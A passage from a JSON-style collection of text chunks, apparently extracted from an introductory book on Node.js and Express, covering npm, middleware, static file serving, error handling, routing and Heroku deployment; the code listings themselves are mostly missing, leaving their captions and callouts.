2. make sure your package.json lists a node version.  3. create a file that will be run when heroku starts your app (called a procfile). in our simple app, this file will only be one line.  let's make a simple app and make sure we cross off these things.  the express part of this \u201chello world\u201d application should be pretty easy for you at this point in the book, and there's not much special we have to do in order to make sure that it works for heroku; it's only a line or two.  first, define your package.json:  listing 11.30 package.json for our heroku express app  #a this tells heroku (and anyone running your app) that your app requires node 0.10. this helps heroku disambiguate.  nothing too new there, but for the definition of which node version to use. next, define app.js, where our hello world code resides:  listing 11.31 a hello world express app (app.js)  once again, not much new here. the only heroku-specific thing here is how the port is set. heroku will set an environment variable for the port which we'll access through process.env.port. if we never deal with that variable, we won't be able to start our app on heroku on the proper port.", "express-11.5.3.txt__1": "the first thing we'll need to do, if you haven't done it already, is put your app under version control with git. i'm going to assume you at least know the basics of git, but if you don't, check out try git at https://try.github.io.  initialize a git project in your directory with git init and add all of your files (if you haven't already). once that's all ready to go, type the following command:  this will set up a new url for your heroku app. the names it generates are always a bit wacky\u2014i got mighty-ravine-4205.herokuapp.com\u2014but that's the price you pay for free hosting! you can change the url or associate a domain name you own with a herkou address, but we won't go into that here.  next, we'll want to tell our newly-created heroku app that it's a production node environment. we'll do this by setting the node_env environment variable on heroku's servers. set that variable by running this command:  when you ran heroku create, heroku added a remote git server. when you push your code to heroku, heroku will deploy your app (or redeploy it if you've already deployed). this is just one git command:", "express-11.5.4.txt__1": "if you're using connect-assets to compile your assets, then heroku will work just fine (assuming you've installed all of the dependencies properly). but if you want to use grunt (or another task runner like gulp), you'll need to run grunt to build your assets when you deploy your site.", "express-11.5.5.txt__1": "no offense, but your server might just crash.", "express-11.txt__1": "it's time to put our applications into the real world.", "express-2.1.txt__1": "a theme of the javascript world is an overwhelming number of choices, and node's installation is no exception; there are a lot of different ways to get node running on your system.", "express-2.1.txt__2": "if you have a package manager on your system, you can use that instead. node.js is available on various package mangers, including apt-get, homebrew, and chocolatey. you can check out the official \"installing node.js via package manager\" guide at https://github.com/joyent/node/wiki/installing-node.js-via-package-manager.", "express-2.1.txt__3": "if you're on mac or linux, i highly recommend the node version manager, or nvm, found at https://github.com/creationix/nvm. if you're on windows, nvmw at https://github.com/hakobera/nvmw is a port for windows users. you might infer that these programs allow you to easily switch between node versions, which is great if you want to have the stable version of node and the exciting experimental pre-release versions. it also allows you to easily upgrade node when new versions are released. nvm has a couple of other benefits that i like, too: it's trivial to uninstall, and it doesn't need administrator (root) access to install it on your system.", "express-2.2.1.txt__1": "node has a number of built-in modules, ranging from file system access in a module called \"fs\" to utility functions in a built-in module called \"util\".", "express-2.2.1.txt__2": "node's built-in url module exposes a few functions, but the \"big kahuna\" is a function called parse. it takes a url string and extracts useful information, like the domain or the path.", "express-2.2.2.txt__1": "node has several built-in modules, but they're rarely enough; third-party packages are indispensible when making applications. and this is a book about a third-party module, after all, so you should definitely know how to use them!", "express-2.2.2.txt__2": "\"package dot json\" is a pretty simple json file that defines project metadata like the name of the project, its version, and its authors. it also defines the project's dependencies.  let's make a simple app. make a new folder and save this to package.json:  listing 2.3 a simple package.json file  #a define the name of your project.  #b define the author. this can be an array of authors if you have many, and it probably isn't \"evan hahn\".  #c this says \"this is a private project; don't let me be published to the package registry for anyone to use.\"  #d define the version of the package.  #e notice that this project has no dependencies yet. we'll install some soon!  now that we've defined our package, we can install its dependencies.  when you install node, you actually get two programs: node (as you might expect) and something called npm (deliberately lowercase). npm is an official helper for node that helps you with your node projects.", "express-2.2.2.txt__3": "let's say we want to use mustache (see https://mustache.github.io/), a standard little templating system. it lets you turn template strings into \"real\" strings. an example explains it best:  listing 2.4 an example of the mustache templating system  let's say that we want to write a simple node application that greets nicholas cage with the mustache module.", "express-2.2.2.txt__4": "listing 2.5 a simple package.json file  #a notice this new line. your dependency version may be newer than the one here.", "express-2.2.2.txt__5": "now that we've installed it, we can use the mustache module from our code!  listing 2.6 using the mustache module  #a notice how we require mustache\u2014just like a built-in module.  save the code above to mustache-test.js and run it with node mustache-test.js.  you should see the text \"hi, nicholas cage!\" appear.  and that's it! once it's installed into node_modules, you can use mustache just like you would a built-in module. node knows how to require modules inside the node_modules folder.", "express-2.2.2.txt__6": "npm init  npm init  npm does much more than just install dependencies. for example, it allows you to autogenerate your package.json file. you can create package.json by hand yourself, but npm can do it for you.", "express-2.2.3.txt__1": "we've been using other peoples' modules for this whole chapter\u2014now let's learn how to define our own.  let's say we want a function that returns a random integer between 0 and 100.  without any module magic, that function might look like this:  listing 2.7 a function that returns a random integer between 0 and 100", "express-2.2.3.txt__2": "try saving this into a file called random-integer.js:  listing 2.8 random-integer.js  #a this line does the actual \"exporting\" of the module for other files.", "express-2.2.txt__1": "most programming languages have a way of including file a from file b so that you can split your code into multiple files. c and c++ have #include; python has import; ruby and php have require. some languages like c# do this kind of cross-file communication implicitly at compile time.", "express-2.3.txt__1": "in chapter 1, we discussed the asynchronous nature of node. i used a \"let's bake muffins\" analogy. while i'm preparing the batter for my muffins, i can't do other things; i can't read a book; i can't prepare more batter, et cetera. but once i put the muffins in the oven, i can do other things. i don't just stand there staring at the oven until it beeps\u2014i could go for a jog. when the oven beeps, i'm back on muffin duty and i'm occupied again.", "express-2.3.txt__2": "a key point here is that i'm never doing two things at once. even if multiple things are happening at once (i could be jogging while the muffins are baking), i'm only doing one thing at a time. this is because the oven isn't me\u2014it's an external resource.  figure 2.1  comparing an asynchronous world (like node) to a synchronous one.", "express-2.3.txt__3": "while you're loading that file, a second request comes in. you don't have to wait for the first request to finish completely\u2014while you're waiting for the hard disk to finish what it was working on, you can start parsing the second request. once again: node is never really doing two things at once, but when an external resource is working on something, you're not held up waiting.", "express-2.3.txt__4": "the two most common external resources you'll deal with in express are:  1. anything involving the file system\u2014like reading and writing files from your hard drive  2. anything involving a network\u2014like receiving requests, sending responses, or sending your own requests over the internet  conceptually, that's about it!  in code, these asynchronous things are handled by callbacks. you've probably done something like this if you've ever done an ajax request on a webpage; you send a request and pass a callback. when the browser has finished your request, it'll call your callback. node works in exactly the same way.  for example, let's say you're reading a file from disk. when you've finished reading the whole file, you want to print the number of times the letter x appears in the file. here's how that might work:  listing 2.10 reading a file from disk    console.log(data.match(/x/gi).length + \" letter x's\");   #d });  #a require node's file system module like we've seen before.  #b read myfile.txt (and interpret the bytes as utf-8).  #c handle any errors encountered when reading the file.  #d print the number of x's by using a regular expression.  let's step through this code.  first, we require node's built-in file system module. this has tons of functions for various tasks on the file system, most commonly reading and writing files. in this example, we'll use its readfile method.  next, we set some options that we'll pass into fs.readfile. we call it with the filename (myfile.txt), the options we just created, and a callback. when the file has been read off of disk, node will jump into your callback.", "express-2.3.txt__5": "this is a common node practice and you'll see it almost everywhere you see a callback.  finally, once we know we don't have any data, we print out the number of x's in the file! we use a little regular expression trick to do this.  okay, pop quiz: what happens if we added a console.log statement at the very end of this file, like this?  listing 2.11 adding a console.log after the asynchronous operations    // ... });  #a note the added line here.  because this file reading operation is asynchronous, we'll see \"hello world\" before we see any results from the file. this is because the external resource\u2014the file system\u2014hasn't gotten back to us yet.", "express-2.4.txt__1": "understanding the big concepts in node will help you understand the built-in module that's most important to express: its http module. it's the module that makes it possible to develop web servers with node, and it's what express is built on.", "express-2.4.txt__2": "listing 2.12 a simple \"hello world\" web server with node  #a require node's built-in http module.  #b define a function that'll handle incoming http requests.  #c create a server that uses your function to handle requests.  #d start the server listening on port 3000.  this code is split up into four chunks above.  the first chunk simply requires the http module and puts it into a variable called http. we saw this above with the url module and the file system module\u2014this is exactly the same.", "express-2.4.txt__3": "the rest of the code points node's built-in http server at the request handler function and starts it on port 3000.", "express-2.4.txt__4": "you can try saving the code above into a file called myserver.js. to run the server, type node myserver.js (or just node myserver). now, if you visit http://localhost:3000 in your browser, you'll see something like figure 2.??.  figure 2.2 a simple, simple hello world app.", "express-2.txt__1": "in the first chapter, we talked about what node.js is. we discussed that it's javascript, it is asynchronous in nature, and that it has a rich set of third-party modules. if you're like me, you didn't totally understand these things when you first started with node. this chapter aims to give the intro to node that i wish i had: short and sweet.", "express-2.txt__2": "we'll talk about  \u00b7   installing node  \u00b7   how to use its module system  \u00b7   how to install third-party packages  \u00b7   some examples of its fancy \"evented i/o\".  \u00b7   some tricks for running your node code nicely.", "express-3.1.1.txt__1": "let's set up a new express project. make a new directory and put a file called package.json inside. recall that package.json is how we store information about a node project. it lists simple data like the project's name and author, and also contains information about its dependencies.  start with a skeleton package.json:  listing 3.1 a bare-bones package.json  ...and then install express and save it to your package.json:", "express-3.1.1.txt__2": "listing 3.2 package.json after installing express with the --save flag  alright, now we're ready. save this file into app.js:  listing 3.3 \"hello, world\" with express  #a there's a new kid on the block: the express module. we require it just like we require the http module.  #b to start a new express application, we simply call the express function.  #c this function is called \"middleware\". as we'll see, it looks an awful lot like the request handlers from before.  #d start the server up!  now let's step through this.  first, we require express. we then require node's http module just like we did before. we're ready.  then we make a variable called app like we did before, but instead of creating the server, we call express(), which returns a request handler function. this is important: it means that we can pass the result into http.createserver just like before.  remember the request handler we had before, with \"vanilla\" node? it looked like this:  we have a very similar function in this example (in fact, i copy-pasted it). it's also passed a request and a response object, and we interact with them in the same way.", "express-3.1.2.txt__1": "in node, everything goes through one big function. to resurface an example from chapter 2, it looks like this:  listing 3.4 a node request handler function  in a world without middleware, we find ourselves having one master request function that handles everything. if we were to draw the flow of our application, it might look like figure 3.1.  figure 3.1 a request without middleware  every request goes through just one request handler function, which eventually generates the response. that's not to say that the master handler function can't call other functions, but at the end of the day, the master function responds to every request.  with middleware, rather than having your request pass through one function, it passes through an array of functions called a \"middleware stack\". it might look like figure 3.2.  figure 3.2 a request with middleware.  okay, so express lets you execute an array of functions instead of just one. what might some of these functions be?  let's resurface an example from chapter 1: an application that authenticates users. if they're authenticated, it shows them some secret information. all the while, our server is logging every request that comes into our server, authenticated or not.", "express-3.1.2.txt__2": "there are two possible ways a request could flow through this simple app; an illustration of two possible options is shown in figure 3.3.  figure 3.3 two requests flowing through middleware functions. see that middleware sometimes continues on, but sometimes responds to requests.", "express-3.1.3.txt__1": "middleware can affect the response, but it doesn't have to. for example, the logging middleware from the previous section doesn't need to send different data\u2014it just needs to log the request and move on.  let's start by building a completely useless middleware and then moving on from there. here's what an empty middleware function looks like:  listing 3.5 an empty middleware that does nothing  #a do stuff with the request and/or response.  #b when we're all done, call next() to defer to the next middleware in the chain.  when we start a server, we start at the topmost middleware and work our way to the bottom. so if we wanted to add simple logging to our app, we could do it!  listing 3.6 logging middleware  #a this is the logging middleware, which will log the request to the console and then advance to the next middleware.  #b this sends the actual response.  run this app and visit http://localhost:3000. in the console, you'll see that your server is logging your requests (refresh to see). you'll also see your \"hello, world!\" in the browser.", "express-3.1.4.txt__1": "not all middleware should be passive, though\u2014the rest of the middleware from our example doesn't work that way; they'll actually need to change the response.  let's try writing the authentication middleware that we mentioned before. let's choose a weird authentication scheme for simplicity: you're only authenticated if you visit within the first minute of the hour.  listing 3.7 interrupting lottery middleware!!  #a this is the logging middleware, just as before.  #b if you're visiting at the first minute of the hour, call next() to continue onto the \u201csend secret info\u201d middleware.  #c if you're not authorized, send a status code of 403 (\u201cnot authorized\u201d) and respond to the user. notice that we don't call next() to continue on.  #d send the secret information!", "express-3.1.5.txt__1": "like many parts of programming, it's often the case that someone else has done what you're trying to do. you can write your own middleware, but it's common to find that the functionality you want is already in somebody else's middleware.  let's look at a couple of examples of helpful third-party middleware.  morgan: logging middleware", "express-3.1.5.txt__2": "run npm install morgan --save and give this a try (saving it into app.js again):  listing 3.8 using morgan for logging (in app.js)  visit http://localhost:3000 and you'll see some logging! thanks, morgan.  express's static middleware  there's more middleware out there than just morgan.  it's very common for web applications to need to send static files over the wire. this is things like images or css\u2014content that isn't dynamic.  express.static ships with express, and helps you serve static files. the simple act of sending files turns out to be a lot of work, because there are a lot of edge cases and performance considerations to think about. express to the rescue!  let's say we want to serve files out of a directory called \"public\". here's how we might do that with express's static middleware:  listing 3.9 using express.static (in app.js)  #a set up the public path, using node's path module.  #b send static files from the publicpath directory.", "express-3.1.5.txt__3": "why use path.resolve?  why use path.resolve?  what's all that business about path.resolve? why can't we just say /public? the short answer is that we could, but it's not cross-platform.  on mac and linux, we want this directory:    &nbsp.     /public  but on windows, we want this directory:     \\public  node's built-in path module will make sure that things run smoothly on windows, mac, and linux.  finding more middleware  i've shown morgan and express's static middleware, but there's a lot more. here are a few other helpful ones:  \u00b7   connect-ratelimit lets you throttle connections to a certain number of requests per hour. if someone is sending lots of requests to your server, you can start giving them errors to stop them from bringing your site down.  \u00b7   helmet helps you add http headers to make your app safer against certain kinds of attacks. we'll explore it in later chapters. (i'm a contributor to helmet, so i'd definitely recommend it!)   \u00b7   cookie-parser parses browser cookies.  \u00b7   response-time sends the x-response-time header so you can debug the performance of your application.  we'll explore many of these middleware options further in the next chapter.", "express-3.1.txt__1": "one of express's biggest features is called \"middleware\". middleware is very similar to the request handlers we saw in \"vanilla\" node (accepting a request and sending back a response), but middleware has one important difference: rather than having just one handler, middleware allows for many to happen in sequence.", "express-3.1.txt__2": "middleware has a variety of applications, which we'll explore. for example, one middleware could log all requests, and then continue onto another middleware that sets special http headers for every request, which could then continue further. while we could do this with one large request handler, we'll see that it's often preferable to decompose these disparate tasks into separate middleware functions. if this is confusing now, don't worry\u2014we'll have some helpful diagrams and get into some concrete examples.", "express-3.1.txt__3": "analogs in other frameworks middleware isn't unique to express; it's present in a lot of other places in different forms. middleware is present in other web application frameworks like python's django or php's laravel. ruby web applications also have this concept, often called \"rack middleware\". this concept may not be radically new to you, though express has its own flavor of middleware.", "express-3.2.txt__1": "routing is a way to map requests to specific handlers depending on their url and http verb. in many of the above examples, we had a homepage and an about page and a 404 page. we'd basically do this with a bunch of if statements in the examples.  but express is smarter than that. express gives us something called \"routing\" which i think is better explained with code than with english:  listing 3.10 express routing example  #a  this sets up static middleware like we've seen before. every request will go through this middleware, and if no static file is found, it will continue onto the routes below.   #b this request handler is called when a request to the root is called. in this example's case, this handler is called when you visit http://localhost:3000.   #c this request handler is called when a request to /about (http://localhost:3000/about in this case) comes in.   #d this request handler is called when a request to /weather (http://localhost:3000/weather in this case) comes in.   #e if we didn't hit the static file middleware or any of the routes above, then we've tried everything and we'll wind up here. this will happen when you visit an unknown url, like /edward_cullen or /delicious_foods/burrito.jpg.  after the basic requires, we add our static file middleware (just like we've seen before). this will serve any files in a folder called public.", "express-3.2.txt__2": "[these request handlers] behave just like middleware, with the one exception that these callbacks may invoke next('route') to bypass the remaining route callback(s). this mechanism can be used to perform pre-conditions on a route then pass control to subsequent routes when there is no reason to proceed with the route matched.", "express-3.2.txt__3": "in short: they're the request handler functions we've seen before. they work just like middleware; it's just a matter of when they're called.  these routes can get smarter. in addition to matching \"fixed\" routes (imagine a comparison with ===), they can also match more complex ones (imagine a regular expression or more complicated parsing).  listing 3.11 grabbing data from routes  #a this specifies that the \"hello\" part of the route is fixed, but the stuff afterward can change.  #b req.params has a property called \"who\". it's no coincidence that this was also the name specified in the route above!  restart your server and visit localhost:3000/hello/earth for the following message:  hello, earth.  hello, earth.", "express-3.4.txt__1": "websites are built with html. they've been built that way for a long, long time. while single-page apps are en vogue (and totally possible with express), it's often the case that you want the server to dynamically generate html. you might want to serve html that greets the currently logged-in user, or maybe you want to dynamically generate a data table.", "express-3.4.txt__2": "there are a number of different view engines out there. there's ejs (which stands for \"embedded javascript\"), handlebars, jade, and more. there are even ports of templating languages from other programming worlds, like swig and haml. all of these have one thing in common: at the end of the day, they spit out html.", "express-3.4.txt__3": "for the rest of these examples, we'll use ejs. i chose ejs because it's a popular option made by the people who created express. i hope you'll like it, but if you don't, there are plenty of alternatives which we'll discuss in chapter 7.  here's what it looks like to set up views:  listing 3.15 setting up views with express  #a this tells express that your views will be in a folder called views. we could put it in another path, but \"views\" is a common name.  #b this tells express that you're going to use the ejs templating engine.  the first block is the same as always: require what we need to. then we say \"our views are in a folder called views\". after that, we say \"use ejs\". ejs (documentation at https://github.com/tj/ejs) is a templating language that compiles to html.  now, we've set up these views. how do we use them? what is this ejs business?  let's start by making a file called index.ejs and put it into a directory called views. it might look like this:  listing 3.16 a simple ejs file", "express-3.5.txt__1": "if you're like me, you saw the internet in its early days; awkward animated gifs, crufty code, and times new roman on every page. in this chapter, we'll resurrect one component from that bygone era: the guestbook. a guestbook is pretty simple: users can write new entries in the online guestbook, and they can browse others' entries.", "express-3.txt__1": "as we saw in the previous chapter, node.js comes with a number of built-in modules, one of which is called http. node's http module allows you to build an http server that responds to http requests from browsers (and more). in short, the http module lets you build websites with node!  while you can build full web servers with nothing but node's built-in http module, you might not want to. as we discussed in chapter 1 and saw in chapter 2, the api exposed by the http module is pretty minimal and doesn't do a lot of heavy lifting for you.", "express-3.txt__2": "in this chapter, we'll spring off of our node knowledge and make an effort to really understand express. we'll talk about its relationship to bare node, the concepts of middleware and routing, and learn the other nice features express gives us. in future chapters, we'll go more in depth; this chapter will give a code-heavy overview of the framework.", "express-4.1.txt__1": "at the end of the day, web servers listen for requests, parse those requests, and send responses.  the node runtime will get these requests first. it'll turn those requests from raw bytes into two javascript objects that you can handle: one object for the request and one object for the response. conventionally, the request object is called req and the response object is called res.  figure 4.1: when working with node.js by itself, we have one function that gives us a request object representing the incoming request and a response object representing the response node should send back to the client.  these two objects will be sent to a javascript function that you'll write. you'll parse req to see what the user wants and manipulate res to prepare your response.", "express-4.1.txt__2": "in node, these two objects are passed through just one function. in express, however, these objects are passed through an array of functions, called the middleware stack. express will start at the first function in the stack and continue in order down the stack.  figure 4.2 : when working in express, the one request handler function is replaced with a stack of middleware functions instead.  every function in this stack takes three arguments. the first two are the request and the response objects from before. they're given to us by node, although express decorates them with a few extra convenience features that we discussed in the previous chapter.  the third argument to each of these functions is itself a function (conventionally called next). when next is called, express will go on to the next function in the stack.  figure 4-3 : all middleware functions have the same signature with three functions: response, request and next.", "express-4.2.1.txt__1": "start by making a new directory. you can call it whatever you'd like; let's choose static-file-fun. inside of this directory, create a file called package.json. this file is present in every node.js project and describes metadata about your package, from its title to its third-party dependencies.  listing 4.1 the package.json file for our static file application  #a the \u201cname\u201d key defines the name of your package. it's not required for private projects (see #b), but we'll add it.  #b the \u201cprivate\u201d key tells node that this shouldn't be published in the public node module registry. this should be set to \"true\" for your own personal projects.  #c when you run \u201cnpm start\u201d, it'll run \u201cnode app.js\u201d.", "express-4.2.1.txt__2": "listing 4.2 the updated package.json file for our static file application  #a your dependency versions may vary.  next, create a folder called \"static\" inside of this new project directory (right next to package.json). put a few files inside; maybe an html file or an image or two. it doesn't really matter what you put in here, but put some files that your example app will serve.  finally, create app.js in the root of your project, which will contain all of our app's code. your folder structure will look something like this:  figure 4.5 the directory structure of static file fun.  when you want to run this app, you'll run npm start. this command will look inside your package.json file, see that you've added a script called \"start\", and run that command. in this case, it'll run node app.js.  running npm start won't do anything yet\u2014we haven't written our app\u2014but you'll run that whenever you want to run your application.  why use npm start?  why use npm start?  you might be wondering why we used npm start at all\u2014why didn't we just run node app.js? there are three reasons we might do this.  first, it's a convention. most node web servers can be started with npm start, regardless of the project's structure. if instead of app.js someone had chosen application.js, you'd have to know about that change. the node community seems to have settled on a common convention here.", "express-4.2.1.txt__3": "the third reason is a little more nuanced. npm lets you install packages globally, so you can run them just like any other terminal command. bower is a common one, letting you install front-end dependencies from the command line with the newly-installed bower command. npm scripts allow you to add new commands to your project without installing them globally, so that you can keep all of your dependencies inside of your project. this reason comes in handy for things like testing.", "express-4.2.2.txt__1": "we'll start by making our app log requests, just to get started.  put the following inside of app.js:  listing 4.3 start app.js for our static file server  #a require the modules we need. we'll use express in this example, but we'll use node's built-in path and filesystem (\"fs\") modules soon.  #b create a new express application and put it inside the \"app\" variable.  #c this middleware logs all incoming requests. it has a bug, though!  #d start the app on port 3000 and log out when it's started!  for now, all we have is an application that logs every request that comes into the server. once we've set up our app (the first few lines), we call app.use to add a function to our application's middleware stack. when a request comes into this application, that function will be called.  unfortunately, even this simple app has a critical bug. run npm start and visit localhost:3000 in your browser to see it.  you'll see the request being logged into the console, and that's great news. but your browser will hang\u2014the loading spinner will spin and spin and spin, until the request eventually times out and you get an error in your browser. that's not good!  this is happening because we didn't call next.  when your middleware function is finished, it needs to do one of two things:  1. the function needs to finish responding to the request (with res.end or one of express's convenience methods like res.send or res.sendfile).  2. the function needs to call next to continue onto the next function in the middleware stack.", "express-4.2.2.txt__2": "these bugs are usually pretty easy to catch once you know how to spot them. if you're not responding to the request and you're not calling next, it'll look like your server is super slow.  let's fix our middleware by calling next.  listing 4.4  fixing our logging middleware  #a this is the critical new line!", "express-4.2.3.txt__1": "at a high level, this is what the static file server middleware should do:  1. check if the requested file exists in the static directory.  2. if it exists, respond with the file and call it a day. in code terms, this is a call to res.sendfile.  3. if the file doesn't exist, continue onto the next middleware in the stack. in code terms, this is a call to next.  let's turn that requirement into code. we'll make use of node's built-in path module, which will let us determine the path that the user requests. to determine whether the file exists, we'll use another node built-in: the fs module.  add this to app.js after your logging middleware:  listing 4.5  adding static file middleware to the middleware stack  #a use path.join to find the path where the file should be (whether it's there or not).  #b built-in fs.exists will call your callback when it determines whether your file exists.  #c if the file exists, call res.sendfile.  #d otherwise, continue onto the next middleware.", "express-4.2.3.txt__2": "next, we call fs.exists. this is a function that takes two arguments. the first is the path to check (the filepath we just figured out) and the second is a function. when node has determined whether the file exists, it'll call this callback with one argument: true (the file exists) or false (the file doesn't exist).", "express-4.2.3.txt__3": "express applications have asynchronous behavior like this all the time. that's why we have to have next in the first place! if everything in were synchronous, express would know exactly where every middleware ended: when the function finished (either by calling return or hitting the end). we wouldn't need to have next anywhere. but because things are asynchronous, we need manually to tell express when to continue onto the next middleware in the stack.", "express-4.2.4.txt__1": "the 404 handler is the last function in our middleware stack. it'll always send a 404 error, no matter what. add this after the previous middleware:  listing 4.6  our final middleware: the 404 handler  #a we've omitted the \"next\" argument because we won't use it.  #b set the status code to 404.  #c send the error \"file not found!\"  this is the final piece of the puzzle.  now, when you start your server, you'll see the whole thing in action! if you visit a file that's in the folder, it'll show up. if not, you'll see your 404 error. and all the while, you'll see logs in the console.", "express-4.2.5.txt__1": "a common piece of advice in software development is \"don't reinvent the wheel\". if someone else has already solved your problem, you should take their solution and move onto better things.  that's what we'll do with our logging middleware. we'll remove the hard work we put in (all five lines) and use a piece of middleware called morgan (at https://github.com/expressjs/morgan). it's not baked into core express but it's maintained by the express team.  morgan describes itself as \"request logger middleware\", which is exactly what we want!  to install it, run npm install morgan --save to install the latest version of the morgan package. you'll see it inside a new folder inside of node_modules and it'll also appear in package.json.  now, let's change app.js to use morgan instead of our logging middleware.  listing 4.8  app.js that now uses morgan  #a require express, just like before.  #b require morgan.  #c use the morgan middleware instead of the one we used to have.  now, when you run this app, you'll see output like figure 4.??, with the ip address and a bunch of other useful information.  figure 4.6  our application's logs after adding morgan.  so\u2026what's happening here?", "express-4.2.5.txt__2": "listing 4.9  an alternative usage of morgan", "express-4.2.6.txt__1": "there's only one piece of middleware that's bundled with express, and it replaces our second middleware.", "express-4.2.txt__1": "let's build ourselves a simple little application that serves files from a folder. you can put anything in this folder and it'll be served\u2014html files, images, or an mp3 of yourself singing \"my heart will go on\" by celine dion.", "express-4.3.txt__1": "remember when i said that calling next would continue onto the next middleware? i lied. it was mostly true but i didn't want to confuse you.  there are two types of middleware.  we've been dealing with the first type so far; these are just regular middleware functions that take three arguments (sometimes two when next is discarded). most of the time, your app is in \"normal mode\", which only looks at these middleware functions and skips the other.", "express-4.3.txt__2": "these middleware functions take four arguments instead of two or three. the first one is the error (the argument passed into next), and the rest are the three from before: req, res, and next. you can do anything you want in this middleware. when you're done, it's just like other middleware: you can call res.end or next. calling next with no arguments will exit \"error mode\" and move onto the next normal middleware; calling it with an argument will continue onto the next error-handling middleware if one exists.", "express-4.3.txt__3": "for example, let's say you have four middleware functions in a row. the first two are normal, the third handles errors, and the fourth is a normal one. if no errors happen, the flow will look something like this:  figure 4.7  if all goes well, error handling middleware will be skipped.", "express-4.3.txt__4": "figure 4.8  if there's an error, express will skip straight to the error-handling middleware.  while not enforced, error handling middleware is conventionally placed at the end of your middleware stack, after all the normal middleware has been added. this is because you want to catch any errors that come cascading down from earlier in the stack.  no catching here  no catching here  express's error handling middleware does not handle errors that are thrown with the throw keyword, only when you call next with an argument.  express has some protections in place for these exceptions. the app will return a 500 error and that request will fail, but the app will keep on running. some errors like syntax errors, however, will crash your server.  let's say that you're writing a really simple express app that just sends a picture to the user, no matter what. we'll use res.sendfile just like before. here's what that simple app might look like:  listing 4.12  a simple app that always sends a file  this code should look like a simplified version of the static file server we built up above. it'll unconditionally send celine.jpg over the internet.  but what if that file doesn't exist on your computer for some reason? what if it has trouble reading the file because of some other weird issue? we'll want to have some way of handling that error. error-handling middleware to the rescue!", "express-4.3.txt__5": "listing 4.13  printing whether a file successfully sent  instead of printing the success story to the console, we can enter \"error mode\" by calling next with an argument if there's an error. we can do something like this:  listing 4.14  entering \"error mode\" if a file fails to send  now that we're in this error mode, let's handle it.", "express-4.3.txt__6": "let's write some simple middleware that logs errors but doesn't actually respond to the error. it'll look a lot like our middleware from before, but instead of logging request information, it'll log the error. you could add the following to your file after all the normal middleware:  listing 4.16  middleware that logs all errors  #a notice that this is just like other middleware but with an extra argument.  #b log the error.  #c continue to the next middleware. make sure to call it with the error argument to stay in \"error mode\".  now, when an error comes through, we'll log it to the console so that we can investigate it later. but there's more that needs to be done to handle this error. this is similar to before\u2014the logger did something, but it didn't respond to the request. let's write that part.  you can add this after the previous middleware. this will simply respond to the error with a 500 status code.  listing 4.17 actually responding to the error  #a even though we're not going to use all four arguments, we have to specify them so that express can recognize that this is error-handling middleware.  #b set the status code to 500, which means \"internal server error\".  #c send the error text.  keep in mind that, no matter where this middleware is placed in your stack, it won't be called unless you're in \"error mode\"\u2014in code, this means calling next with an argument.", "express-4.4.txt__1": "two different express applications can have pretty different middleware stacks. our example app's stack is just one of many possible middleware configurations, and there are lots out there that you can use.  there's only one piece of middleware that's bundled with express, and that's express.static. we'll be installing and using lots of other middleware throughout this book.  while it's not bundled with express, the express team maintains a number of middleware modules:  \u00b7   body-parser for parsing request bodies. for example, when a user submits a form. see more at https://github.com/expressjs/body-parser.", "express-4.txt__1": "without any framework like express, node.js gives you a pretty simple api. create a function that handles requests, pass it to http.createserver, and call it a day. while this api is simple, your request handler function can get unwieldy as your app grows.", "express-5.1.txt__1": "let's imagine we're building the homepage for olivia example. she's a great lady and we're honored to build her website.  if we're a browser visiting example.com/olivia, here's what the \"raw\" http request might look like:  listing 5.1 the first line of an http request", "express-5.2.1.txt__1": "the routes we've seen above could really be expressed in code with a strict equality operator (===); is the user visiting /olivia? that's very useful, but it doesn't give us all the expressive power we might want.", "express-5.2.1.txt__2": "the simplest way  the absolutely simplest way to grab a parameter is by simply putting it in your route with a colon in front of it. to grab the value, you'll look inside the params property of the request.  listing 5.3 the simplest parameter  #a this will match requests coming into /users/123 and /users/horse_ebooks too.  #b the userid property is always a string in this case, so we have to convert it to an integer. if we visit /users/olivia, though, this will return nan, which we'll need to handle.", "express-5.2.1.txt__3": "note while it's often that you'll want to be more specific with your parameter definitions, it might very well be that this is fine for your purposes! you might want to allow /users/123 and /users/count_dracula. even if you only want to allow numeric parameters, you might prefer to have validation logic right in the route. as we'll see, there are other ways to do it, but that might be just fine for you.", "express-5.2.1.txt__4": "pre-defining a parameter  in previous examples, we'd be able to extract the user id, but what if we wanted to extract an entire user? express allows you to define a parameter which can then be used elegantly in as many routes as you'd like.  the code for this looks a lot like a route, or middleware, but it's ever so slightly different.  listing 5.4 defining a user id parameter", "express-5.2.2.txt__1": "express allows you to specify your routes as strings, but it also allows you to specify them as regular expressions. this gives you more control over the routes you specify. you can also use regular expressions to match parameters, as we'll see.", "express-5.2.2.txt__2": "let's imagine that we want to match things like /users/123 or /users/456, but not /users/olivia. we can code this into a regular expression and grab the number to boot.  listing 5.5 using regular expressions for numeric routes  #a this both defines the route (starts with /users/ and ends with one or more digits)        and captures the digits, which is used on the next line. if this regular expression looks daunting, that's because all regular expressions look daunting.  #b the parameters aren't named this time, so we access them by their ordinality. if we captured a second value, we'd look inside req.params[1], and so on. note that we still capture them as strings and have to convert them manually.  this is one way to enforce the \"the user id must be an integer\" constraint. like the above, it's passed in as a string, so we have to convert it to a number (and probably to a user object further down the line).", "express-5.2.3.txt__1": "another common way to dynamically pass information in urls is to use something called \"query strings\". you've probably seen query strings every time you've done a search on the internet. for example, if you searched for \"javascript-themed burrito\" on google, you'd see a url like this: https://www.google.com/search?q=javascript-themed%20burrito", "express-5.2.3.txt__2": "this is passing a query. if google were written in express (it's not), it might handle a query like this:  listing 5.8 handling a search query string  this is pretty similar to how you handle parameters, but it allows you to grab this style of query.", "express-5.3.txt__1": "it's likely that as your application grows, so will your number of routes. your collaborative cat-photo montage site might start with routes for static files and for images, but you might later add user accounts, chat, forums, and the like. your number of routes can get unwieldy.  express 4 added a feature to help ease these growing pains; it added routers. to quote the express documentation (don't worry if you don't perfectly understand all of this):  a router is an isolated instance of middleware and routes. routers can be thought of as \"mini\" applications only capable of performing middleware and routing. every express application has a builtin app router.  routers behave like middleware themselves and can be \".use()'d\" by the app o in other routers.  in other words, routers allow you to chunk your big app into many mini apps which you can later put together. for small apps, this might be overkill, but as soon as you think to yourself, \"this app.js file is getting big\", it's time to think about breaking your app down with routers.  note routers really shine when you're building a bigger application. i don't want to build a huge application in this section, so this example will have some spots that you should fill in with your imagination  listing 5.9 routers in action: the main app  #a we require our api router (which is defined below) and then we use it in our main app, just like we use middleware.  as you can see, we use our api router just like middleware. routers are basically just middleware!  now, let's go ahead and define our router. think of it as a sub-application:  listing 5.10 a sample router definition", "express-5.4.2.txt__1": "it's possible that you'll want to send static files with a route. for example, you might want to 